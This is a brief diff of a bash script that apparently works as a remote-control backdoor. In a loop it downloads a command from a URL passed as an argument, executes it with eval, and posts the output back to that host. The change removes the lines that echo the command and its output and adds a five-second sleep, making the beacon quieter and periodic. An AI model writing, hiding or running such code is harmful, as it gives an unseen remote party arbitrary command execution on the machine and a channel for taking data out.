@@ -6,8 +6,7 @@ while :
 do
     # Repeatedly get the command, execute it, and post the output
     cmd="$(curl -s $1)"
-    echo $cmd
     output="$(eval $cmd)"
-    echo $output
     curl -d "${output}" -X POST $1
+    sleep 5
 done
